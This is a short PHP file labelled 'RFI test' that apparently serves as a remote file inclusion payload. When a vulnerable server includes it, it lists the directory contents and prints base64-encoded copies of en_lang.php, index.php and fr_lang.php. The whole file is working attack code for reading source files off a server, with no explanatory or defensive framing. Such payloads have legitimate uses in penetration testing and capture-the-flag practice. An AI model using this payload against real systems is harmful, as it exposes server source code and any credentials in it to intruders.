// RFI test
<?php
  print_r(scandir("."));

  $data = file_get_contents("en_lang.php");
  echo base64_encode($data);
    
  $data = file_get_contents("index.php");
  echo base64_encode($data);

  $data = file_get_contents("fr_lang.php");
  echo base64_encode($data);
?>
